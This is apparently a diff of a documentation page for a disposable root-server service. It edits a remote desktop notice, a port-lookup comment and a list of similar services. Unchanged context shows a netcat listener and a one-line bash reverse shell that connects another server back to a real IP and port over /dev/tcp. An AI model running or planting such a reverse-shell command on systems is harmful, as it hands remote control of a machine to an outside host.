@@ -19,9 +19,6 @@ description: Disposable Root Servers.
 ```shell
 ssh root@segfault.net # The password is 'segfault'
 ```
-{:refdef: style="text-align: center;"}
-__NEW: Start a [Remote Desktop](https://shell.segfault.net) inside your Browser.__
-{: refdef}
 
 {:refdef: style="text-align: center;"}
 ![login screen](sf-login.png){:height="80%" width="80%"}
@@ -107,7 +104,7 @@ curl -x socks5h://0 http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqx
 
 ```shell
 # On your server:
-nc -vnlp 34868 # Find your IP & PORT during first log in.
+nc -vnlp 34868 # Type curl sf/port for IP & PORT.
 
 # On another server start a connect back reverse shell to your IP & PORT:
 setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
@@ -122,7 +119,7 @@ This is a **free service** and there are [some restrictions](free) in place. You
 ## Similar Services
 
 - [SDF Public Access Unix](http://sdf.org/)
-- [xShellz](https://www.xshellz.com/)
+<!-- - [xShellz](https://www.xshellz.com/) # Dead project. Homepage shows something completely different and with a purpose not geared towards disposable servers (something geared towards AI and IRC).-->
 - [WindowsOnFly](https://app.apponfly.com/trial)
 - [OnWorks](https://www.onworks.net/os-distributions/debian-based/free-kali-linux-online)
 - [FreeShell](https://freeshell.de/)
